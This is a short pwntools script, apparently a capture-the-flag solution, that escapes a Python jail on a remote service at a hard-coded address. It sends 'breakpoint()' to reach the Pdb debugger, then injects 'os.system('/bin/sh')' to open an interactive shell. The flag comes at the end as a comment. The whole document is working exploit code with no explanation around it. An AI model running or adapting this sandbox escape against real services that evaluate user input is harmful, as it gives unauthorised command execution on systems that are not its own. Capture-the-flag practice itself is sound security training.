from pwn import *

r = remote("35.226.249.45", 5000)

r.sendline(b"breakpoint()")
r.recvuntil(b"Pdb")
r.sendline(b"import os; os.system('/bin/sh')")

r.interactive()
#uoftctf{you_got_out_of_jail_free}